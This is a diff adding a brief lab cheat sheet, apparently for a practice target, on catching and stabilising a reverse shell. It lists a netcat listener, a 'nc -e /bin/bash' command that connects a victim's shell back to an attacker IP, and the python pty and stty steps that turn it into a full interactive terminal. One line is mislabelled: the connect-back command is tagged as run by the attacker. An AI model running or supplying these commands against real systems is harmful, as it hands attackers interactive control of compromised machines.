@@ -1,0 +1,23 @@
+[[[LINE 2 AND 3 ARE JUST FOR INTERACTING WITH APP 1 YOUR FIRST VICTIM]]]
+(ATTACKER) nc -nlvp 4444
+(ATTACKER) nc -e /bin/bash 192.168.122.209 4444
+
+[BELOW IS HOW YOU WILL UPGRADE YOUR SHELL]
+
+(VICTIM) python3 -V (THIS WILL TELL YOU WHAT VERSION YOUR SHELL IS)
+(VICTIM) python3 -c 'import pty; pty.spawn("/bin/bash")'   (this prevents shell braking from raw input)
+(VICTIM) Ctrl + Z (background the shell)
+
+(ATTACKER) stty raw -echo; fg (FOREGROUNDS SHELL)
+(ATTACKER) reset
+
+(VICTIM) echo $TERM (CHECK)
+(VICTIM) export TERM=xterm-256color (TELLS YOUR TERMINAL TYPE)
+(VICTIM) echo $TERM (CHECK)
+(VICTIM) echo $SHELL (CHECK)
+(VICTIM) export SHELL=/bin/bash
+(VICTIM) echo $SHELL (CHECK)
+
+(ATTACKER) echo $TERM && tput lines && tput cols (THIS TELLS YOU TERMINAL SIZE)
+
+(VICTIM) stty rows 38 columns 116 (THIS CHANGES TERMINAL SIZE)
